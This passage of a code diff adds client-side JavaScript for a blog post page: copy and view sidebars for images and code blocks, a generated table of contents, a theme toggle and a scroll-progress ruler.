+          mobileBar.className = "mobile-topbar mobile-topbar--image";
+          mobileBar.innerHTML = `
+            <span>${getImageFormat(img.src)}</span>
+            <span class="mobile-topbar__divider">|</span>
+            <button type="button" class="asset-sidecar__button" title="Open image">[ VIEW ]</button>
+          `;
+          mobileBar.querySelector("button")?.addEventListener("click", () => {
+            window.openImageModal(img.src, img.alt || "image");
+          });
+
+          wrapWithSidecar(host, sidecar, mobileBar, "image-wrapper inline-asset-row--image", "image-area");
+        });
+
+        const codeBlocks = Array.from(root.querySelectorAll("pre"));
+        codeBlocks.forEach((pre) => {
+          if (pre.closest(".inline-asset-row")) return;
+          const code = pre.querySelector("code")?.textContent ?? "";
+          const lines = code ? code.replace(/\n+$/, "").split("\n").length : 0;
+
+          const sidecar = document.createElement("div");
+          sidecar.className = "desktop-sidecar desktop-sidecar--code";
+          sidecar.innerHTML = `
+            <div class="asset-sidecar__label asset-sidecar__meta"><span>CODE</span><span class="asset-sidecar__divider">|</span><span>${lines}</span></div>
+            <button type="button" class="asset-sidecar__button" title="Copy code">[ COPY ]</button>
+          `;
+          sidecar.querySelector("button")?.addEventListener("click", (event) => {
+            window.copyCode(event.currentTarget);
+          });
+
+          const mobileBar = document.createElement("div");
+          mobileBar.className = "mobile-topbar mobile-topbar--code";
+          mobileBar.innerHTML = `
+            <span>CODE</span>
+            <span class="mobile-topbar__divider">|</span>
+            <span class="mobile-topbar__spacer">${lines}</span>
+            <button type="button" class="asset-sidecar__button" title="Copy code">[ COPY ]</button>
+          `;
+          mobileBar.querySelector("button")?.addEventListener("click", (event) => {
+            window.copyCode(event.currentTarget);
+          });
+
+          wrapWithSidecar(pre, sidecar, mobileBar, "code-wrapper inline-asset-row--code", "code-area");
+        });
+      };
+
+      const initPostChrome = () => {
+        const root = document.querySelector(".prose");
+        const tocToggle = document.querySelector(".toc-toggle");
+        const tocOverlay = document.querySelector(".toc-overlay");
+        const tocSidebar = document.querySelector(".toc-sidebar");
+        const tocContent = document.querySelector(".toc-content");
+        const closeBtn = document.querySelector(".close-btn");
+        const themeBtn = document.getElementById("theme-toggle-single");
+        const ruler = document.querySelector(".ruler-scrollbar");
+        const rulerIndicator = document.querySelector(".ruler-indicator");
+        const rulerValue = document.querySelector(".ruler-value");
+
+        if (themeBtn && !themeBtn.dataset.bound) {
+          themeBtn.dataset.bound = "true";
+          themeBtn.addEventListener("click", () => {
+            const isDark = document.documentElement.classList.toggle("dark");
+            localStorage.setItem("theme", isDark ? "dark" : "light");
+          });
+        }
+
+        if (!root || !tocToggle || !tocOverlay || !tocSidebar || !tocContent || !closeBtn) return;
+
+        enhanceObsidianEmbeds(root);
+        enhanceMarkdownCallouts(root);
+        enhanceMarkdownTables(root);
+        enhanceProseBlocks(root);
+
+        const headings = Array.from(root.querySelectorAll("h1, h2, h3, h4, h5, h6"));
+        tocContent.innerHTML = "";
+        let minLevel = 6;
+
+        const items = headings
+          .map((heading, index) => {
+            if (!heading.id) heading.id = `heading-${index}`;
+            const level = Number(heading.tagName.replace("H", ""));
+            if (level < minLevel) minLevel = level;
+            return { id: heading.id, text: heading.textContent?.trim() ?? "", level, heading };
+          })
+          .filter((item) => item.text.length > 0);
+
+        const setOpen = (isOpen) => {
+          tocSidebar.classList.toggle("open", isOpen);
+          tocToggle.classList.toggle("open", isOpen);
+          tocOverlay.style.display = isOpen ? "block" : "none";
+        };
+
+        tocToggle.onclick = () => setOpen(!tocSidebar.classList.contains("open"));
+        closeBtn.onclick = () => setOpen(false);
+        tocOverlay.onclick = () => setOpen(false);
+
+        items.forEach((item) => {
+          const node = document.createElement("div");
+          node.className = "toc-item svelte-1r6e6jk";
+          node.style.paddingLeft = `${(item.level - minLevel) * 1.5 + 1.5}rem`;
+          node.innerHTML = '<div class="toc-item-inner svelte-1r6e6jk"><span class="caret-placeholder svelte-1r6e6jk"></span><span class="toc-text svelte-1r6e6jk"></span></div>';
+          const textNode = node.querySelector(".toc-text");
+          if (textNode) textNode.textContent = item.text;
+          node.addEventListener("click", () => {
+            const top = item.heading.getBoundingClientRect().top + window.scrollY - 80;
+            window.scrollTo({ top, behavior: "smooth" });
+            if (window.innerWidth < 1024) setOpen(false);
+          });
+          tocContent.appendChild(node);
+        });
+
+        const tocNodes = Array.from(tocContent.querySelectorAll(".toc-item"));
+
+        const updateActiveHeading = () => {
+          let activeId = "";
+          for (let i = items.length - 1; i >= 0; i -= 1) {
+            const rect = items[i].heading.getBoundingClientRect();
+            if (rect.top <= 120) {
+              activeId = items[i].id;
+              break;
+            }
+          }
+          if (!activeId && items.length) activeId = items[0].id;
+
+          tocNodes.forEach((node, i) => {
+            node.classList.toggle("active", items[i].id === activeId);
+          });
+        };
+
+        const updateRuler = () => {
+          if (!rulerIndicator || !rulerValue) return;
+          const max = document.documentElement.scrollHeight - window.innerHeight;
+          const progress = max > 0 ? window.scrollY / max : 0;
+          rulerIndicator.style.top = `${Math.max(0, Math.min(100, progress * 100))}%`;
+          rulerValue.textContent = progress.toFixed(2);
+          rulerValue.classList.add("visible");
+          clearTimeout(window.__rulerTimer);
+          window.__rulerTimer = setTimeout(() => rulerValue.classList.remove("visible"), 800);
+        };
+
+        const onScroll = () => {
+          updateActiveHeading();
+          updateRuler();
+        };
+
+        window.addEventListener("scroll", onScroll, { passive: true });
+        window.addEventListener("resize", onScroll);
+
+        if (ruler && !ruler.dataset.bound) {
+          ruler.dataset.bound = "true";
+          ruler.addEventListener("mousedown", (event) => {
+            const rect = ruler.getBoundingClientRect();
+            const ratio = Math.max(0, Math.min(1, (event.clientY - rect.top) / rect.height));
+            const top = ratio * (document.documentElement.scrollHeight - window.innerHeight);
+            window.scrollTo({ top, behavior: "smooth" });
+          });
+        }
+
+        document.querySelector('[data-action="top"]')?.addEventListener("click", () => {
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        });
+        document.querySelector('[data-action="bottom"]')?.addEventListener("click", () => {
+          window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" });
+        });
+        document.querySelector('[data-action="expand"]')?.addEventListener("click", () => {
+          setOpen(true);
+        });
+        document.querySelector('[data-action="collapse"]')?.addEventListener("click", () => {
+          setOpen(false);
+        });
+
+        onScroll();
+      };
+
+      initPostChrome();
+      document.addEventListener("astro:page-load", initPostChrome);
+    })();</script> </body> </html>
